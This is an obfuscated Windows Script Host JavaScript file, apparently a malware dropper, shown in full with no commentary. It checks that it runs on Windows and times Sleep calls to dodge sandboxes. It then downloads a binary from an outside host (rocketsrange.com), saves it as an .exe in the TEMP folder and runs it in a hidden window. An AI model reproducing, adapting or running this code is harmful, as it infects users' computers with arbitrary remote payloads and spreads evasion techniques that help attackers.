var _OR = false;
var _H = "CreateObject";
var _I0 = function _I() {return WScript[_H]("WScript"+".Shell");}(), _MP = 11;
var _FL = "MSXML2.XMLHTTP";
var _LF = 2123213;
var _NA = 0;
function _HQ(_U){_I0["Run"](_U, _NA, _NA);};
function _UF(){return _FL + "";};
function _J(_G, _A){_NA = _NA * 1; return _G - _A;};
function _WO(){return _H;};
/*@cc_on
  @if (@_win32 || @_win64)
    _OR = true;
  @end
@*/
if (_OR)
{
var _YU = "";
function _PP(){return 22;};
var _MM = 0; var _H0 = 0;
function _T()
{
var _JB = new this["Date"]();
var _L = _JB["getUTCMilliseconds"]();
WScript["Sleep"](_PP());
var _JB = new this["Date"]();
var _IU = _JB["getUTCMilliseconds"]();
WScript["Sleep"](_PP());
var _JB = new this["Date"]();
var _M = _JB["getUTCMilliseconds"]();
var _MM = "_B";
_MM = _J(_IU, _L);
var _H0 = "_K";
_H0 = _J(_M, _IU);
_YU = "open";
return _J(_MM, _H0);
}
var _X = false;
var _R = false;
for (var _MJ = _NA; _MJ < _PP() * 1; _MJ++){if (_T() != _NA){
_X = true; 
_H0 = "31" + 11 * _MM + _H0; 
_R = true; 
break;
}}
function _XR() {return ((_X == true) && (_X == _R)) ? 1 : _NA;};
if (_X && _XR() && _R){
function _D() {return _I0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jsHTx6XacBS.ex" + "e";};
 _C = _UF();
 _Z = WScript[_H](_C);
 var _KA = 1;
 while (_KA){
try {
	if (_KA == 1)
	{
		_Z[_YU]("GET", "http://rocketsrange.com/b5ksa", false);
		_Z["send"]();
		_ZH = "Sleep";
	}
	WScript[_ZH](_PP() + 120); 
	if (_Z["readystate"] < 2 * 2) continue;
	_KA = _NA;
	function _CW(_DJ) {var _N = (1, 2, 3, 4, 5, _DJ); return _N;};
	_WJ0 = WScript[_WO()]("ADODB.Stream");
	_C = _WJ0;
	_C[_YU]();
	_C["type"] = _CW(1);
	_C["write"](_Z["ResponseBody"]);
	_WJ0["position"] = _CW(_NA);
	_C["Save" + "ToFile"](_D(), 2);
	_WJ0["cl"+"ose"]();
	_LA = _D();
	_HQ(_LA);
} catch(_WJ){};
}
}
}

